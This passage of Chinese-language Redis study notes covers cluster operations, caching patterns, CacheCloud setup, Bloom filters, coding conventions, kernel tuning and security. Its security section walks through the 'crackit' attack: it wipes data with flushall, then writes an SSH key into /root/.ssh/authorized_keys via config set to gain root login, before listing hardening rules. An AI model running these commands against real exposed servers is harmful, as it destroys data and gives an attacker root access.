  - 执行 slusterDelSlot 撤销故障主节点负责的槽，并执行 clusterAddSlot 把这些槽分配给自己
  - 向集群广播自己的 pong 消息，表明已经替换了故障从节点

#### 故障模拟

1. kill -9 节点模拟宕机
2. 观察客户端故障恢复时间
3. 观察各个节点的日志

### 常见问题

#### 集群完整性

- cluster-require-full-coverage 默认为 yes
  - 集群中 16384 个槽全部可用：保证集群完整性
  - 节点故障或者正在故障转移：(err) CLUSTERDOWN The cluster is down
- 大部分业务无法容忍，cluster-require-full-coverage 建议设置为 no

#### 带宽消耗

- 官方建议：1000 个节点
- PING/PONG 消息
- 不容忽视的带宽消耗

消息发送频率：节点发现和其他节点最后通信消息超过 cluster-node-timeout/2 时会直接发送 ping 消息

消息数据量：slots 槽数组(2KB 空间)和整个集群 1/10 的状态数据(10 个节点状态数据约 1KB)

节点部署的机器规模：集群分布的机器越多且每台机器划分的节点数越均匀，则集群内整体的可用带宽越高

#### 优化

- 避免"大"集群：避免多业务使用一个集群，大业务可以多集群
- cluster-node-timeout：带宽和故障转移速度的均衡
- 尽量均匀分配到多机器上：保证高可用和带宽

#### Pub/Sub 广播

- 问题：publish 在集群每个节点广播：加重带宽
- 解决：单独"走"一套 Redis Sentinel

#### 数据倾斜

- 数据倾斜：内存不均
  - 节点和槽分配不均
    - `redis-trib.rb info ip:port`查看节点、槽、键值分布
    - `redis-trib.rb rebalance ip:port`进行均衡(谨慎使用)
  - 不同槽对应键值数量差异较大
    - CRC16 正常情况下比较均匀
    - 可能存在 hash_tag
    - `cluster countkeysinslot {slot}`获取槽对应键值个数
  - 包含 bigkey
    - bigkey：例如大字符串、几百万的元素的 hash、set 等
    - 从节点：`redis-cli --bigkeys`
    - 优化：优化数据结构
  - 内存相关配置不一致
    - hash-max-ziplist-value、set-max-intset-entries 等
    - 优化：定期"检查"配置一致性
- 请求倾斜：热点
  - 热点 key：重要 key 或者 bigkey
  - 优化：
    - 避免 bigkey
    - 热键不要用 hash_tag
    - 当一致性不高时，可以用本地缓存 + MQ

#### 读写分离

- 只读连接：集群模式的从节点不接受任何读写请求
  - 重定向到复制槽的主节点
  - `readonly`命令可以读：连接级别命令
- 读写分离：更加复杂
  - 同样的问题：复制延迟、读取过期数据、从节点故障
  - 修改客户端 :cluster slaves {nodeId}

#### 数据迁移

- 官方迁移：redis-trib.rb import
  - 只能从单机迁移到集群
  - 不支持在线迁移：source 需要停写
  - 不支持断点续传
  - 单线程迁移：影响速度
- 在线迁移：
  - 唯品会：redis-migrate-tool
  - 豌豆荚：redis-port

```shell
redis-trib.rb import --from 127.0.0.1:6388 --copy 127.0.0.1:7000
```

#### 集群限制

- key 批量操作支持有限：例如 mget、mset 必须在一个 slot
- key 事务和 Lua 支持有限：操作的 key 必须在一个节点
- key 是数据分区的最小粒度：不支持 bigkey 分区
- 不支持多个数据库：集群模式下只有一个 db 0
- 复制只支持一层：不支持树形复制结构

Redis Cluster：满足容量和性能的扩展性，很多业务"不需要"

- 大多数时客户端性能会"降低"
- 命令无法跨 节点使用：megt、keys、scan、flush、sinter 等
- Lua 和事务无法跨节点使用
- 客户端维护更复杂：SDK 和应用本身消耗(例如更多的连接池)

很多场景 Redis Cluster 已经足够好

## 缓存

### 好处和成本

#### 好处

1. 加速读写

通过缓存加速读写速度：CPU L1/L2/L3 Cache、Linux page Cache、Linux 加速硬盘读写、浏览器缓存、Ehcache 缓存数据库结果

2. 降低后端负载

后端服务器通过前端缓存降低负载：业务端使用 Redis 降低后端 MySQL 负载等

#### 成本

1. 数据不一致：缓存层和数据层有时间窗口不一致，和更新策略有关
2. 代码维护成本：多了一层缓存逻辑
3. 运维成本：例如 Redis Cluster

#### 使用场景

1. 降低后端负载：对高消耗的 SQL：join 结果集/分组统计结果缓存
2. 加速请求响应：利用 Redis/Memcache 优化 IO 响应时间
3. 大量写合并为批量写：如计数器先 Redis 累计再批量写 DB

### 更新策略

1. LRU/LFU/FIFO 算法剔除：例如 maxmemory-policy
2. 超时剔除：例如 expire
3. 主动更新：开发控制生命周期

### 缓存粒度

1. 通用性：全量属性更好
2. 占用空间：部分属性更好
3. 代码维护：表面上全量属性更好

### 缓存穿透

大量请求不命中

#### 原因

1. 业务代码自身问题
2. 恶意攻击、爬虫等等

#### 如何发现

1. 业务的响应时间
2. 业务本身问题
3. 相关指标：总调用数、缓存层命中数、存储层命中数

#### 解决方法

1. 缓存空对象
2. 布隆过滤器拦截

### 缓存雪崩

由于 cache 服务承载大量请求，当 cache 服务异常/脱机，流量直接压向后端组件(例如 DB)，造成级联故障

#### 优化方案

1. 保证缓存高可用性

- 个别节点、个别机器、甚至是机房
- 例如 Redis Cluster、Redis Sentinel、VIP

2. 依赖隔离组件为后端限流
3. 提前演练：例如压力测试

### 无底洞问题

参考：[http://highscalability.com/blog/2009/10/26/facebooks-memcached-multiget-hole-more-machines-more-capacit.html](http://highscalability.com/blog/2009/10/26/facebooks-memcached-multiget-hole-more-machines-more-capacit.html)

- 更多的机器 更多的性能
- 批量接口需求(mget,mset 等)
- 数据增长与水平扩展需求

#### 优化 IO

1. 命令本身优化：例如慢查询 keys、hgetall bigkey
2. 减少网络通信次数
3. 降低接入成本：例如客户端长连接/连接池、NIO 等

### 热点 key 的重建优化

热点 key + 较长的重建时间

1. 减少缓存重建的次数
2. 数据尽可能一致
3. 减少潜在风险

#### 解决方案

- 互斥锁(mutex key)
- 永远不过期

## CacheCloud

CacheCloud 提供一个 Redis 云管理平台：实现多种类型(Redis Standalone、Redis Sentinel、Redis Cluster)自动部署、解决 Redis 实例碎片化现象、提供完善统计、监控、运维功能、减少运维成本和误操作，提高机器的利用率，提供灵活的伸缩性，提供方便的接入客户端。

### 安装

#### 参考：[https://github.com/sohutv/cachecloud/wiki/3.%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%8E%A5%E5%85%A5%E6%96%87%E6%A1%A3](https://github.com/sohutv/cachecloud/wiki/3.%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%8E%A5%E5%85%A5%E6%96%87%E6%A1%A3)

```shell
#下载项目
cd /opt
git clone https://github.com/sohutv/cachecloud.git

#导入数据库
mysql -uroot -p
create database cachecloud;
use cachecloud;
source /opt/cachecloud/script/cachecloud.sql

#本地 修改配置文件local.properties
vim /opt/cachecloud/cachecloud-open-web/src/main/swap/local.properties
#生产环境 修改配置文件online.properties
vim /opt/cachecloud/cachecloud-open-web/src/main/swap/online.properties

#本地启动
#在cachecloud根目录下运行
cd /opt/cachecloud
mvn clean compile install -Plocal
#在cachecloud-open-web模块下运行
cd /opt/cachecloud/cachecloud-open-web
mvn spring-boot:run

#生产环境启动
#在cachecloud根目录下运行
mvn clean compile install -Ponline
#拷贝war包(cachecloud-open-web/target/cachecloud-open-web-1.0-SNAPSHOT.war)到/opt/cachecloud-web下
mkdir /opt/cachecloud-web
cp /opt/cachecloud/cachecloud-open-web/target/cachecloud-open-web-1.0-SNAPSHOT.war /opt/cachecloud-web/
#拷贝配置文件(cachecloud-open-web/src/main/resources/cachecloud-web.conf)到/opt/cachecloud-web下，并改名为cachecloud-open-web-1.0-SNAPSHOT.conf（spring-boot要求，否则配置不生效）
cp /opt/cachecloud/cachecloud-open-web/src/main/resources/cachecloud-web.conf /opt/cachecloud-web/
cd /opt/cachecloud-web/
mv cachecloud-web.conf cachecloud-open-web-1.0-SNAPSHOT.conf
#启动方法1(作为系统服务启动，可能存在系统兼容性问题，目前redhat6.5,centos7正常)
sudo ln -s /opt/cachecloud-web/cachecloud-open-web-1.0-SNAPSHOT.war /etc/init.d/cachecloud-web
/etc/init.d/cachecloud-web start
#启动方法2(使用脚本启动，大部分操作系统都正常) 拷贝启动脚本(cachecloud根目录下script目录下的start.sh和stop.sh)到/opt/cachecloud-web下
cp /opt/cachecloud/script/start.sh /opt/cachecloud-web/
cp /opt/cachecloud/script/stop.sh /opt/cachecloud-web/
sh start.sh #如果机器内存不足，可以适当调小:-Xmx和-Xms(默认是4g)
sh stop.sh
```

local.properties 和 online.properties 属性配置

|         属性名         |               说明               |                  示例                   |
| :--------------------: | :------------------------------: | :-------------------------------------: |
|   cachecloud.db.url    |          mysql 驱动 url          | jdbc:mysql://127.0.0.1:3306/cache-cloud |
|   cachecloud.db.user   |           mysql 用户名           |                  admin                  |
| cachecloud.db.password |            mysql 密码            |                  admin                  |
|        web.port        | spring-boot 内嵌 tomcat 启动端口 |  启动端口 测试 9999,线上 8585(可修改)   |

http://127.0.0.1:9999/manage/login 使用用户名:admin、密码:admin 访问系统

### 配置

1. 添加机器

```shell
#用户名cachecloud和密码cachecloud要跟配置修改中的保持一样
cd /opt/cachecloud/script
sh cachecloud-init.sh cachecloud
cachecloud
```

进入后台管理，点击机器管理，添加新机器

2. 添加应用

## 布隆过滤器

实现原理：一个很长的二进制向量和若干个哈希函数
参数：m 个二进制向量，n 个预备数据，k 个哈希函数

### 误差率

- 肯定存在误差：恰好都命中了
- 直观因素：m/n 的比率，hash 函数的个数
- m/n 与误差率成反比，k 与误差率成反比

### 本地布隆过滤器

- 现有库：guava

参考：[http://ifeve.com/google-guava-hashing](http://ifeve.com/google-guava-hashing)

- 本地布隆过滤器的问题：
  - 容量受限制
  - 多个应用存在多个布隆过滤器，构建同步复杂

### Redis 布隆过滤器

基于位图实现

#### 实现方法

- 定义布隆过滤器构造参数：m、n、k、误差率
- 定义布隆过滤器操作函数：add 和 contain
- 封装 Redis 位图操作
- 开发测试样例

#### 基于 Redis 单机实现存在的问题

- 速度慢：比本地慢，输出网络
  - 解决：单独部署，与应用同机房甚至机架部署
- 容量受限：Redis 最大字符串为 512MB、Redis 单机容量
  - 解决：基于 Redis Cluster 实现

### Redis 分布式布隆过滤器

- 多个布隆过滤器：二次路由
- 基于 Pipeline 提高效率

## 开发规范

### 键值设计

#### key 设计

- 可读性和可管理性：以业务名(或数据库名)为前缀(防止 key 冲突)，用冒号分割，比如业务名:表名:id,如：ugc:video:1
- 简洁性：保证语义的前提下，控制 key 的长度，当 key 较多，内存占用也不容忽视(redis3:39 字节 embstr)，如：user:{uid}:friends:messages:{mid}简化为 u:{uid}:fr:m:{mid}
- 不要包含特殊字符：反例：包含空格、换行、单双引号以及其他转义字符

#### Value 设计

- 拒绝 bigkey
  - string 类型控制在 10KB 以内
  - hash、list、set、zset 元素个数不要超过 5000
- 选择合适的数据结构
- 过期设计

#### bigkey 危害

- 网络阻塞
- Redis 阻塞
- 集群节点数据不均衡
- 频繁序列化：应用服务器 CPU 消耗

#### bigkey 发现

- 应用异常
- `redis-cli --bigkeys`
- scan + debug object key
- 主动报警：网络流量监控、客户端监控
- 内核热点 key 问题优化

#### bigkey 删除

1. 阻塞：注意隐形删除(过期、rename 等)
2. Redis4.0：lazy delete(unlink 命令)

#### bigkey 预防

- 优化数据结构：例如二级拆分
- 物理隔离或者万兆网卡：不是治标方案
- 命令优化：hgetall->hmget、hscan
- 报警和定期优化

### 键值生命周期

- 周期数据需要设置过期时间，`object idle time`可以找垃圾 key-value
- 过期时间不宜集中：缓存穿透和雪崩等问题

### 命令优化

1. O(N)以上命令关注 N 的数量

例如：hgetall、lrange、smembers、zrange、sinter 等并非不能使用，但是需要明确 N 的值。有遍历的需求可以使用 hscan、sscan、zscan 代替

2. 禁用命令

禁止线上使用 keys、flushall、flushdb 等，通过 redis 的 rename 机制禁掉命令，或者使用 scan 的方式渐进式处理

3. 合理使用 select

- redis 的多数据库较弱，使用数字进行区分
- 很多客户端支持较差
- 同时多业务用多数据库实际还是单线程处理，会有干扰

4. 使用批量操作提高效率

原生命令：例如 mget、mset

非原生命令：可以使用 pipeline 提高效率。 但要注意控制一次批量操作的元素个数(例如 500 以内，实际也和元素字节数有关)

::: warning
注意两者不同：

原生是原子操作，pipeline 是非原子操作

pipeline 可以打包不同的命令，原生做不到

pipeline 需要客户端和服务端同时支持
:::

5. Redis 事务功能较弱，不建议过多使用

- Redis 的事务功能较弱(不支持回滚)
- 集群版本(自研和官方)要求一次事务操作的 key 必须在一个 slot 上(可以使用 hashtag 功能解决)

6. Redis 集群版本在使用 Lua 上有特殊要求

- 所有 key，必须在 1 个 slot 上，否则直接返回 error
- "-ERR eval/evalsha command keys must in same slot\r\n"

7. 必要情况下使用 monitor 命令时，要注意不要长时间使用

### 客户端优化

1. 避免多个应用使用一个 Redis 实例

正例：不相干的业务拆分，公共数据做服务化。

2. 使用带有连接池的数据库，可以有效控制连接，同时提高效率

3. 高并发下建议客户端添加熔断功能(例如 netflix hystrix)

4. 设置合理的密码，如有必要可以使用 SSL 加密访问（阿里云 Redis 支持）

5. 根据自身业务类型，选好 maxmemory-policy(最大内存淘汰策略)，设置好过期时间

默认策略是 volatile-lru，即超过最大内存后，在过期键中使用 lru 算法进行 key 的剔除，保证不过期数据不被删除，但是可能会出现 OOM 问题。

其他策略如下：

allkeys-lru：根据 LRU 算法删除键，不管数据有没有设置超时属性，直到腾出足够空间为止

allkeys-random：随机删除所有键，直到腾出足够空间为止

volatile-random: 随机删除过期键，直到腾出足够空间为止

volatile-ttl：根据键值对象的 ttl 属性，删除最近将要过期数据。如果没有，回退到 noeviction 策略

noeviction：不会剔除任何数据，拒绝所有写入操作并返回客户端错误信息”(error) OOM command not allowed when used memory”，此时 Redis 只响应读操作

## 开发运维

### Linux 内核优化

- vm.overcommit_memory

```shell
#获取
cat /proc/sys/vm/overcommit_memory
#设置
#echo "vm.overcommit_memory=1" >> /etc/sysctl.conf
sysctl vm.overcommit_memory=1
```

1. Redis 设置合理的 maxmemory，保证机器有 20%~30%的闲置内存
2. 集中化管理 AOF 重写和 RDB 的 bgsave
3. 设置 vm.overcommit_memory=1，防止极端情况下会造成 fork 失败

- swappiness

```shell
#立即生效
echo {bestvalue} > /proc/sys/vm/swappiness
#永久生效
echo vm.swappiness={bestvalue} >> /etc/sysctl.conf
```

如果 Linux>3.5， vm.swappiness=1，否则 vm.swappiness=0，从而实现如下两个目标：

- 物理内存充足时候，使 Redis 足够快
- 物理内存不足时候，避免 Redis 死掉(如果当前 Redis 为高可用，死掉比阻塞更好)
- THP(Transparent huge page)

1. 作用加速 fork
2. 建议：禁用，可能产生更大的内存开销
3. 坑：源码中是绝对路径，注意不同发行版本的区别

```shell
echo never > /sys/kernel/mm/transparent_hugepage/enabled
```

- OOM killer

1. 作用：内存使用溢出，操作系统按照规则 kill 掉某些进程
2. 配置方法：/proc/{progress_id}/oom_adj 越小，被杀掉概率越小
3. 运维经验：不要过度依赖此特性，应该合理管理内存

- NTP(Net Time Protocol)
  对时
- ulimit

- TCP backlog

```shell
cat /proc/sys/net/core/somaxconn
echo 511 > /proc/sys/net/core/somaxconn
```

### 安全

#### Redis crackit 漏洞

参考：[https://www.aneasystone.com/archives/2015/11/redis-crackit.html](https://www.aneasystone.com/archives/2015/11/redis-crackit.html)

1. 首先确认当前(攻击前)机器 A 不能通过 ssh 访问机器 B，因为没有权限

```shell
ssh root@192.168.153.130
```

2. 由于机器 B 的外网对外开题了 Redis 的 6379 端口，所以可以直接连接到 Redis 上执行 flushall 操作，注意此时破坏性已经很大了

```shell
redis-cli -h 192.168.153.130 -p 6379 ping
redis-cli -h 192.168.153.130 -p 6379 flushall
```

3. 在机器 A 生成公钥，并将公钥保存到一个文件 my.pub 中

```shell
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > my.pub
```

4. 将公钥作为 value 添加到 Redis 中

```shell
cat my.pub | redis-cli -h 192.168.153.130 -p 6379 -x set crackit
redis-cli -h 192.168.153.130 -p 6379 get crackit
```

5. 将 Redis 的 dir 设置为 /root/.ssh/目录，dbfilename 设置为 authorized_keys

```shell
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

6. 此时再次通过 ssh 协议访问机器 B，发现顺利登陆

```shell
ssh root@192.168.153.130
```

登陆后可以观察/root/.ssh/authorized_keys，可以发现它就是 RDB 文件

```shell
cat /root/.ssh/authorized_keys
```

#### 安全法则

1. 设置密码

- 服务端配置：requirepass 和 masterauth
- 客户端连接：auth 命令和-a 参数
- 相关建议：
  - 密码要足够复杂，防止暴力破解
  - masterauth 不要忘记
  - auth 还是通过明文传输

2. 伪装危险命令

- 服务端配置：rename-command 为空或者随机字符
- 客户端连接：不可用或者使用指定随机字符
- 相关建议：
  - 不支持 config set 动态设置
  - RDB 和 AOF 如果包含 rename-command 之前的命令，将无法使用
  - rename-command 命令本身是在 Redis 内核会使用到，不建议设置

3. bind

- 服务端配置：bind 限制的是网卡，并不是客户端 ip
- 相关建议：
  - bind 不支持 config set
  - bind 127.0.0.1 需要谨慎
  - 如果存在外网网卡尽量屏蔽掉

4. 防火墙
5. 定期备份
6. 不使用默认端口，防止被弱攻击杀掉
7. 使用非 root 用户启动
